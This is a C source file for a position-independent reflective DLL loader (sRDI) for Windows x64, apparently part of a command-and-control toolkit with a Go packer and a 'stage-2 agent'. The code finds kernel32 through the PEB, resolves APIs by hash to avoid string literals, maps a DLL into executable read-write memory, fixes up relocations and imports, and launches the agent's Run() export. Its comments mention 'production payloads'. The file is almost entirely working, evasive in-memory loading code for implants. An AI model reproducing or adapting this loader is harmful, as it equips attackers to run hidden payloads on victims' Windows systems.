/*
 * srdi_stub.c — position-independent reflective loader for a Windows x64 DLL.
 *
 * Entry point: stub_entry(uint8_t* dll, size_t dll_len) — the first two
 * parameters arrive in RCX / RDX per the x64 calling convention. The Go packer
 * (srdi.go) emits a self-locating prologue that sets RCX/RDX and jumps here, so
 * the resulting shellcode blob is directly executable by a plain loader.
 *
 * The function performs reflective loading with zero global/static data and no
 * string literals, so it stays fully position independent after objcopy strips
 * the object headers. Built with:
 *
 *   gcc -m64 -ffreestanding -fno-pic -fno-stack-protector -O1 -c srdi_stub.c
 *   objcopy -O binary srdi_stub.o srdi_stub.bin
 *
 * NOTE: the classic sRDI algorithm; validate on a real Windows x64 host before
 * shipping in production payloads.
 */

#include <stdint.h>
#include <stddef.h>

/* ---- flat byte-layout structures used by get_export (identical offsets to
 * stager_stub.c; no struct alignment surprises in a PIC blob) ---- */
typedef struct { uint16_t e_magic; uint8_t pad[60]; int32_t e_lfanew; } WISP_DOS_HDR;
typedef struct { uint32_t Signature; uint16_t Machine; uint16_t NumberOfSections; uint8_t pad0[12]; uint16_t SizeOfOptionalHeader; uint16_t pad1; } WISP_FILE_HDR;

/* ---- minimal PE / NT structures (PE32+) ---- */
typedef struct {
	uint16_t e_magic;
	uint16_t e_cblp;
	uint16_t e_cp;
	uint16_t e_crlc;
	uint16_t e_cparhdr;
	uint16_t e_minalloc;
	uint16_t e_maxalloc;
	uint16_t e_ss;
	uint16_t e_sp;
	uint16_t e_csum;
	uint16_t e_ip;
	uint16_t e_cs;
	uint16_t e_lfarlc;
	uint16_t e_ovno;
	uint16_t e_res[4];
	uint16_t e_oemid;
	uint16_t e_oeminfo;
	uint16_t e_res2[10];
	int32_t  e_lfanew;
} IMAGE_DOS_HEADER;

typedef struct {
	uint16_t Machine;
	uint16_t NumberOfSections;
	uint32_t TimeDateStamp;
	uint32_t PointerToSymbolTable;
	uint32_t NumberOfSymbols;
	uint16_t SizeOfOptionalHeader;
	uint16_t Characteristics;
} IMAGE_FILE_HEADER;

typedef struct {
	uint32_t VirtualAddress;
	uint32_t Size;
} IMAGE_DATA_DIRECTORY;

typedef struct {
	uint16_t Magic;
	uint8_t  MajorLinkerVersion;
	uint8_t  MinorLinkerVersion;
	uint32_t SizeOfCode;
	uint32_t SizeOfInitializedData;
	uint32_t SizeOfUninitializedData;
	uint32_t AddressOfEntryPoint;
	uint32_t BaseOfCode;
	uint64_t ImageBase;
	uint32_t SectionAlignment;
	uint32_t FileAlignment;
	uint16_t MajorOperatingSystemVersion;
	uint16_t MinorOperatingSystemVersion;
	uint16_t MajorImageVersion;
	uint16_t MinorImageVersion;
	uint16_t MajorSubsystemVersion;
	uint16_t MinorSubsystemVersion;
	uint32_t Win32VersionValue;
	uint32_t SizeOfImage;
	uint32_t SizeOfHeaders;
	uint32_t CheckSum;
	uint16_t Subsystem;
	uint16_t DllCharacteristics;
	uint64_t SizeOfStackReserve;
	uint64_t SizeOfStackCommit;
	uint64_t SizeOfHeapReserve;
	uint64_t SizeOfHeapCommit;
	uint32_t LoaderFlags;
	uint32_t NumberOfRvaAndSizes;
	IMAGE_DATA_DIRECTORY DataDirectory[16];
} IMAGE_OPTIONAL_HEADER64;

typedef struct {
	uint8_t  Name[8];
	uint32_t VirtualSize;
	uint32_t VirtualAddress;
	uint32_t SizeOfRawData;
	uint32_t PointerToRawData;
	uint32_t PointerToRelocations;
	uint32_t PointerToLinenumbers;
	uint16_t NumberOfRelocations;
	uint16_t NumberOfLinenumbers;
	uint32_t Characteristics;
} IMAGE_SECTION_HEADER;

typedef struct {
	uint32_t VirtualAddress;
	uint32_t SizeOfBlock;
} IMAGE_BASE_RELOCATION;

typedef struct {
	uint32_t Characteristics; /* OriginalFirstThunk RVA */
	uint32_t TimeDateStamp;
	uint32_t ForwarderChain;
	uint32_t Name;   /* DLL name RVA */
	uint32_t FirstThunk; /* IAT RVA (filled with resolved addresses) */
} IMAGE_IMPORT_DESCRIPTOR;

#define IMAGE_DIRECTORY_ENTRY_BASERELOC 5
#define IMAGE_DIRECTORY_ENTRY_IMPORT 1
#define IMAGE_REL_BASED_DIR64 10
#define MEM_COMMIT 0x1000
#define MEM_RESERVE 0x2000
#define PAGE_EXECUTE_READWRITE 0x40
#define DLL_PROCESS_ATTACH 1

/* FNV-1a hashes of the WinAPI functions we resolve at runtime. */
#define HASH_VirtualAlloc   0x03285501
#define HASH_LoadLibraryA   0x53b2070f
#define HASH_GetProcAddress 0xf8f45725
#define HASH_CreateFileA    0xbdcac9ce
#define HASH_WriteFile      0x7f07c44a
#define HASH_CloseHandle    0xfaba0065

typedef void* (*fnVirtualAlloc)(void* lpAddr, size_t dwSize, uint32_t flAlloc, uint32_t flProtect);
typedef void* (*fnLoadLibraryA)(const char* lpLibFileName);
typedef void* (*fnGetProcAddress)(void* hModule, const char* lpProcName);

/* hash_api — FNV-1a of an export name. */
static uint32_t __attribute__((noinline)) hash_api(const char* name) {
	uint32_t h = 0x811c9dc5;
	while (*name) {
		h ^= (uint8_t)*name++;
		h *= 0x01000193;
	}
	return h;
}

/* get_export returns the address of a module export by FNV-1a hash of its name.
 * PE32+ only. */
static void* __attribute__((noinline)) get_export(void* module_base, uint32_t hash) {
	uint8_t* m = (uint8_t*)module_base;
	if (*(uint16_t*)m != 0x5A4D) return 0;
	WISP_FILE_HDR* fh = (WISP_FILE_HDR*)(m + *(int32_t*)(m + 0x3C));
	if (fh->Signature != 0x00004550) return 0;
	uint8_t* oh = (uint8_t*)fh + 24;
	uint32_t* ddir = (uint32_t*)(oh + 112);
	uint32_t exp_rva = ddir[0];
	if (!exp_rva) return 0;
	uint8_t* exp = m + exp_rva;
	uint32_t n = *(uint32_t*)(exp + 24);
	uint32_t* names = (uint32_t*)(m + *(uint32_t*)(exp + 32));
	uint16_t* ords  = (uint16_t*)(m + *(uint32_t*)(exp + 36));
	uint32_t* funcs = (uint32_t*)(m + *(uint32_t*)(exp + 28));
	uint32_t i;
	for (i = 0; i < n; i++) {
		const char* nm = (const char*)m + names[i];
		if (hash_api(nm) == hash) return (void*)(m + funcs[ords[i]]);
	}
	return 0;
}

/* find_kernel32 — walk PEB->Ldr->InMemoryOrderModuleList and identify kernel32
 * by its EXPORT TABLE, not by its module name. The list node (`cur`) points at
 * the entry's InMemoryOrderLinks field (offset 0x10 inside
 * LDR_DATA_TABLE_ENTRY), so DllBase is at *(cur + 0x20) (entry+0x30).
 * Every module whose export table contains "LoadLibraryA" is kernel32.
 * get_export() is bounds-checked, so this cannot crash on invalid entries.
 */
static void* find_kernel32(void) {
	uint64_t peb;
	__asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(peb));
	uint64_t ldr = *(uint64_t*)((uint8_t*)peb + 0x18);
	uint64_t first = *(uint64_t*)((uint8_t*)ldr + 0x20);
	uint64_t cur = first;
	for (;;) {
		uint64_t dll_base = *(uint64_t*)((uint8_t*)cur + 0x20);
		if (dll_base && get_export((void*)dll_base, HASH_LoadLibraryA)) {
			return (void*)dll_base;
		}
		cur = *(uint64_t*)cur; /* Flink */
		if (cur == first) break;
	}
	return 0;
}

/* stub_entry — the reflective loader. RCX=dll, RDX=dll_len on entry (x64 ABI). */
int stub_entry(uint8_t* dll, size_t dll_len) {
	(void)dll_len;
	void* k32 = find_kernel32();
	if (!k32) return 0;
	fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)get_export(k32, HASH_VirtualAlloc);
	if (!pVirtualAlloc) return 0x60;
	fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)get_export(k32, HASH_LoadLibraryA);
	if (!pLoadLibraryA) return 0x61;
	fnGetProcAddress pGetProcAddress = (fnGetProcAddress)get_export(k32, HASH_GetProcAddress);
	if (!pGetProcAddress) return 0x62;



	IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)dll;
	if (dos->e_magic != 0x5A4D) return 0;
	uint8_t* nt = (uint8_t*)dll + dos->e_lfanew;
	IMAGE_FILE_HEADER* fh = (IMAGE_FILE_HEADER*)(nt + 4);
	IMAGE_OPTIONAL_HEADER64* oh = (IMAGE_OPTIONAL_HEADER64*)(nt + 4 + sizeof(IMAGE_FILE_HEADER));
	if (oh->Magic != 0x20b) return 0; /* PE32+ only */

	/* Allocate SizeOfImage plus extra tail space so the config overlay (copied
	 * to base+SizeOfImage) never writes past the mapping. */
	void* base;
	{
		uint32_t img = oh->SizeOfImage;
		void* b1 = pVirtualAlloc((void*)(uintptr_t)oh->ImageBase, img + 0x4000,
		                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (!b1) b1 = pVirtualAlloc(0, img + 0x4000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (!b1) return 0;
		base = b1;
	}
	uint64_t delta = (uint64_t)base - oh->ImageBase;

	uint8_t* src = (uint8_t*)dll;
	uint8_t* dst = (uint8_t*)base;
	uint32_t i;
	for (i = 0; i < oh->SizeOfHeaders; i++) dst[i] = src[i];

	IMAGE_SECTION_HEADER* sh = (IMAGE_SECTION_HEADER*)(nt + 4 + sizeof(IMAGE_FILE_HEADER) + sizeof(IMAGE_OPTIONAL_HEADER64));
	for (i = 0; i < fh->NumberOfSections; i++, sh++) {
		uint8_t* s = (uint8_t*)dll + sh->PointerToRawData;
		uint8_t* d = (uint8_t*)base + sh->VirtualAddress;
		uint32_t n = sh->SizeOfRawData;
		if (n > sh->VirtualSize) n = sh->VirtualSize;
		uint32_t j;
		for (j = 0; j < n; j++) d[j] = s[j];
	}

	/* Copy the trailing overlay (config appended by the packer after the PE's
	 * actual file data) to base+SizeOfImage so the agent can locate its config
	 * by scanning its module memory when loaded reflectively.
	 *
	 * The overlay may sit INSIDE SizeOfImage (e.g. Rust DLLs have a large .bss
	 * that inflates SizeOfImage beyond the file), so we locate it as the bytes
	 * past the last section's raw-data end, not past SizeOfImage. */
	{
		uint32_t file_end = oh->SizeOfHeaders;
		IMAGE_SECTION_HEADER* sh2 = (IMAGE_SECTION_HEADER*)(nt + 4 + sizeof(IMAGE_FILE_HEADER) + sizeof(IMAGE_OPTIONAL_HEADER64));
		uint32_t si;
		for (si = 0; si < fh->NumberOfSections; si++, sh2++) {
			uint32_t sec_end = sh2->PointerToRawData + sh2->SizeOfRawData;
			if (sec_end > file_end) file_end = sec_end;
		}
		if ((size_t)file_end < dll_len) {
			uint32_t img = oh->SizeOfImage;
			uint8_t* d = (uint8_t*)base + img;
			uint8_t* s = (uint8_t*)dll + file_end;
			uint32_t n = (uint32_t)(dll_len - file_end);
			uint32_t j;
			for (j = 0; j < n; j++) d[j] = s[j];
		}
	}

	/* base relocations */
	if (delta != 0) {
		uint64_t rdd = oh->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
		IMAGE_BASE_RELOCATION* blk = (IMAGE_BASE_RELOCATION*)((uint8_t*)base + rdd);
		while (blk->VirtualAddress) {
			uint32_t count = (blk->SizeOfBlock - 8) / 2;
			uint16_t* entries = (uint16_t*)((uint8_t*)blk + 8);
			uint32_t j;
			for (j = 0; j < count; j++) {
				uint16_t e = entries[j];
				if ((e >> 12) == IMAGE_REL_BASED_DIR64) {
					uint64_t* p = (uint64_t*)((uint8_t*)base + blk->VirtualAddress + (e & 0xFFF));
					*p += delta;
				}
			}
			blk = (IMAGE_BASE_RELOCATION*)((uint8_t*)blk + blk->SizeOfBlock);
		}
	}

	/* imports — walk IMAGE_IMPORT_DESCRIPTOR, resolve each thunk. */
	{
		uint64_t idd = oh->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
		if (idd) {
			IMAGE_IMPORT_DESCRIPTOR* imp = (IMAGE_IMPORT_DESCRIPTOR*)((uint8_t*)base + idd);
			while (imp->Name) {
				char* dllname = (char*)((uint8_t*)base + imp->Name);
				void* hmod = pLoadLibraryA(dllname);
				/* Lookup source: OriginalFirstThunk (if present) else FirstThunk. */
				uint64_t orig = imp->Characteristics;
				uint64_t* iat = (uint64_t*)((uint8_t*)base + imp->FirstThunk);
				uint64_t* src = orig ? (uint64_t*)((uint8_t*)base + orig) : iat;
				uint32_t k;
				for (k = 0; src[k]; k++) {
					uint64_t thunk = src[k];
					if (thunk & 0x8000000000000000ULL) {
						/* ordinal import */
						iat[k] = (uint64_t)(uintptr_t)pGetProcAddress(hmod, (const char*)(uintptr_t)(thunk & 0xFFFF));
					} else {
						/* hint/name: WORD hint then NUL-terminated name */
						uint8_t* hintname = (uint8_t*)base + (uint32_t)thunk;
						iat[k] = (uint64_t)(uintptr_t)pGetProcAddress(hmod, (const char*)(hintname + 2));
					}
				}
				imp++;
			}
		}
	}

	/* Call the agent's real entry: DllMain first (initialises the Go runtime),
	 * then the exported Run() function. The stage-2 agent DLL is a Go c-shared
	 * module; Run() starts the full agent. If the DLL doesn't export Run (not
	 * an agent), DllMain alone serves as a generic reflective-load path. */
	{
		typedef int (*fnDllMain)(void*, uint32_t, void*);
		fnDllMain dllmain = (fnDllMain)((uint8_t*)base + oh->AddressOfEntryPoint);
		if (dllmain) dllmain(base, DLL_PROCESS_ATTACH, 0);
		typedef void (*fnRun)(void);
		fnRun run = (fnRun)get_export((void*)base, 0x8d57e66a); /* "Run" */
			if (run) run();
		}
	return 1;
}
